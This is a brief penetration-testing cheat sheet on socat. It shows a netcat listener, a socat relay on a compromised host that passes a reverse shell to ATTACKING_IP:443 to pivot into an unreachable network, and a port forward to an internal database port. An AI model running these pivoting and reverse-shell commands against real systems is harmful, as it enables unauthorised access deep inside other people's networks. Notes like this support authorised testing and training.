### socat  

## Reverse Shell Relay  

After setting up a listener on the attacker machine e.g.  

`nc -lvnp 443`  

A reverse shell relay can be created on the compromised machine to pivot into a previous unreachable network.  

`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`  

## Port Forward  

Compromised server is 172.0.0.5:33060 and the target is 172.16.0.10:3306.

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`
